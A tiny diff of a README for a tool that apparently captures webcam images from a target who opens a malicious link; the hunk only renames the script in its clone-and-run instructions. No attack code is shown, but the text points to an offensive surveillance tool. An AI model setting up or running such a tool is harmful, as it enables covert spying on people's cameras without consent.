@@ -14,7 +14,7 @@ Take webcam shots from target just sending a malicious link
 ```
 git clone https://github.com/dildoteam/vcs
 cd vcs
-bash vcs.sh
+bash saycheese.sh
 ```
 
 
